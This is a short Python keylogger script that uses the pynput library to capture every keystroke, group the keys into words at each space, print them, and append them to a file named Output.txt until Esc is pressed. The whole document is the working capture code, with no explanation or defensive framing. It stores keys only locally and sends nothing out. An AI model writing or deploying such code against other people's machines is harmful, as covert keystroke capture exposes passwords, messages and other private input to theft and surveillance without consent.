from pynput.keyboard import Key, Listener



filename = "Output.txt"



open(filename, 'w').close()



word = []



def on_press(key):

	if key != Key.space:

		word.append(key)

	else:

		print(word)

		with open(filename, "a") as f:

			for letter in word:

				letter = str(letter).strip("'")

				f.write(str(letter))

			f.write("")

		word.clear()



def on_release(key):

	if key == Key.esc:

		return False



with Listener(on_press=on_press, on_release=on_release) as listener:

	listener.join()